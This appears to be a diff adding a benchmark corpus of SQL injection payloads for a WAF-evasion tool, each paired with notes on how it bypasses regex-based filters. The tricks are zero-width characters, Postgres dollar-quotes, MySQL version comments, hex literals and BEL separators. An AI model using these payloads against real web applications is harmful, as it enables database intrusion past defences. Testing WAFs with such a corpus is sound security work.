@@ -1,0 +1,176 @@
+schema = 1
+# Frontier 2026 tamper-derived SQLi payloads.  Each case targets
+# one of the new tampers shipped in `crates/encoding/src/tamper/builtins.rs`
+# and verifies the resulting payload survives a real MySQL /
+# Postgres tokenizer while defeating a regex-based WAF rule.
+#
+# These are the "manual" form of what `wafrift evade --only
+# tamper/<NAME>` produces — encoded inline so the bench harness
+# can fire them directly without invoking the tamper engine.
+
+# ── Zero-width Unicode injection (U+200B / U+200C / U+200D / U+FEFF) ──
+
+[[case]]
+id = "zw_select_split_zwsp"
+class = "sql"
+payload = "' UNION​ SELECT​ 1,2,3--"
+description = "Zero-width space between keywords. MySQL strips zero-width chars before  tokenizing in many configurations; WAFs that scan `\\bUNION\\b` regex miss."
+
+[[case]]
+id = "zw_select_split_zwj"
+class = "sql"
+payload = "'‍ UNION SELECT 1--"
+description = "Zero-width joiner before the first keyword. The opening quote escape  + ZWJ confuses regex anchors on `^'.*\\bUNION\\b`."
+
+[[case]]
+id = "zw_or_tautology"
+class = "sql"
+payload = "'​ OR‌ 1=1--"
+description = "Zero-width chars between every alpha keyword."
+
+[[case]]
+id = "zw_bom_prefix_select"
+class = "sql"
+payload = "﻿' UNION SELECT 1,2,3 FROM users--"
+description = "Leading BOM (U+FEFF). MySQL ignores it; WAFs that pattern-match  ` '` (starts-with-quote) miss because the BOM is the first byte."
+
+[[case]]
+id = "zw_chained_or_and_and"
+class = "sql"
+payload = "' OR​ 1=1​ AND​ '1'='1"
+description = "Multi-keyword payload, every keyword preceded by a zero-width char."
+
+# ── Postgres dollar-quote bypass ──
+# Note: dialect_quirks.toml already has 2 dollar-quote cases.
+# Add 6 more that exercise the FULL tamper output shape.
+
+[[case]]
+id = "dq_or_chain_with_random_tag"
+class = "sql"
+payload = "$wxyz$' OR 1=1--$wxyz$"
+description = "Random 4-letter tag (matches `postgres_dollar_quote` tamper output  shape).  Postgres parses as a string literal; WAFs miss the  single-quote pattern entirely."
+
+[[case]]
+id = "dq_empty_tag_chained"
+class = "sql"
+payload = "$$' OR 'a'='a$$ /*comment*/ AND $$1=1$$"
+description = "Multiple empty-tag dollar quotes chained.  Postgres parses each  segment independently."
+
+[[case]]
+id = "dq_nested_with_inner_paren"
+class = "sql"
+payload = "$outer$(SELECT user_name FROM users WHERE id=1)$outer$"
+description = "Subquery wrapped in dollar-quote.  Pattern-match for SELECT inside  parens never fires."
+
+[[case]]
+id = "dq_inside_where_clause"
+class = "sql"
+payload = "WHERE name = $x$' OR '1'='1$x$"
+description = "Dollar-quote replacing the canonical 'admin' literal in a WHERE  clause.  Operator-level bypass on quote-anchored WAF rules."
+
+[[case]]
+id = "dq_unicode_tag"
+class = "sql"
+payload = "$α$' UNION SELECT $α$"
+description = "Postgres accepts Unicode identifiers in tags (≥9.0).  WAFs that  only scan ASCII miss the tag entirely."
+
+[[case]]
+id = "dq_long_tag"
+class = "sql"
+payload = "$aVeryLongTagThatLooksLikeAVariable$' OR 1=1$aVeryLongTagThatLooksLikeAVariable$"
+description = "Long, identifier-shaped tag.  WAFs scanning for `$<short>$` patterns  miss the multi-char form."
+
+# ── MySQL version-gated comment wrap ──
+
+[[case]]
+id = "myver_wrap_outer_select"
+class = "sql"
+payload = "/*!50000 SELECT 1 FROM users WHERE name='admin'*/"
+description = "Entire statement wrapped in version-gated comment.  WAFs that strip  C-style comments see empty payload; MySQL ≥5.0 executes."
+
+[[case]]
+id = "myver_nested_versions"
+class = "sql"
+payload = "/*!50000 UNION /*!40000 SELECT */ 1,2,3 */"
+description = "Nested version-gated comments at different MySQL versions.  Catches  WAFs that only handle one level of comment stripping."
+
+[[case]]
+id = "myver_version_specific_keywords"
+class = "sql"
+payload = "SELECT * FROM users WHERE id=/*!50001 1 OR 1=1 */"
+description = "Version-gated tautology in a WHERE clause.  MySQL 5.0.1+ executes  the OR; older versions ignore.  Same payload, conditional execution."
+
+[[case]]
+id = "myver_quote_escape_within"
+class = "sql"
+payload = "/*!50000 ' OR \"a\"=\"a\" */"
+description = "Mixed-quote tautology inside version comment.  Tokenizer sees  the quotes; WAF that strips comments first sees nothing."
+
+# Bracket-confusable XSS payloads moved to ../xss/frontier_tamper_2026.toml
+# (class must match directory per the corpus-integrity gate).
+
+# ── Hex-literal keyword (MySQL/Postgres) ──
+
+[[case]]
+id = "hex_literal_admin_compare"
+class = "sql"
+payload = "WHERE name = 0x61646d696e"
+description = "Hex literal of 'admin' (0x61=a, 0x64=d, 0x6d=m, 0x69=i, 0x6e=n).   MySQL/Postgres treat as string; WAFs scanning for `name='admin'`  pattern miss."
+
+[[case]]
+id = "hex_literal_or_payload"
+class = "sql"
+payload = "' OR name=0x61646d696e --"
+description = "Hex literal in OR tautology.  Standard pattern-evasion via  non-quoted string representation."
+
+[[case]]
+id = "hex_literal_in_union"
+class = "sql"
+payload = "' UNION SELECT 0x61,0x62,0x63 --"
+description = "UNION with all hex-literal columns.  Common pattern in MySQL  CTF / training labs."
+
+[[case]]
+id = "hex_literal_long_string"
+class = "sql"
+payload = "' OR name = 0x73797374656d73 --"
+description = "Hex literal of 'systems'.  Demonstrates the technique scales to  arbitrary string lengths."
+
+# ── BEL-separator bypass ──
+
+[[case]]
+id = "bel_separator_union_select"
+class = "sql"
+payload = "UNION\u0007SELECT\u00071,2,3"
+description = "BEL (U+0007) as token separator.  MySQL accepts as whitespace;  WAFs that only tokenize on canonical `\\s` miss."
+
+[[case]]
+id = "bel_separator_or_tautology"
+class = "sql"
+payload = "'\u0007OR\u00071=1\u0007--"
+description = "BEL between every token of an OR tautology.  Canonical example  of non-ASCII-whitespace bypass."
+
+[[case]]
+id = "bel_separator_mixed_with_tabs"
+class = "sql"
+payload = "'\u0007OR\t1=1\u0007--"
+description = "Mixed BEL + tab separators.  Stresses WAFs that strip tab but  not BEL during normalization."
+
+# ── Combined-tamper payloads (frontier composition) ──
+
+[[case]]
+id = "combo_zw_in_dq_string"
+class = "sql"
+payload = "$x$' UNION​ SELECT 1,2,3 $x$"
+description = "Dollar-quote wrap + zero-width injection.  Two independent bypass  vectors stacked — WAF would have to defeat both."
+
+[[case]]
+id = "combo_hex_in_myver_wrap"
+class = "sql"
+payload = "/*!50000 SELECT * FROM users WHERE name=0x61646d696e */"
+description = "Version-gated comment + hex literal.  Composition of two tampers  from the same family."
+
+[[case]]
+id = "combo_bel_in_dq_string"
+class = "sql"
+payload = "$tag$'\u0007OR\u00071=1$tag$"
+description = "Dollar-quote + BEL separator.  String literal contents are opaque  to most WAF rules; double-bypass."
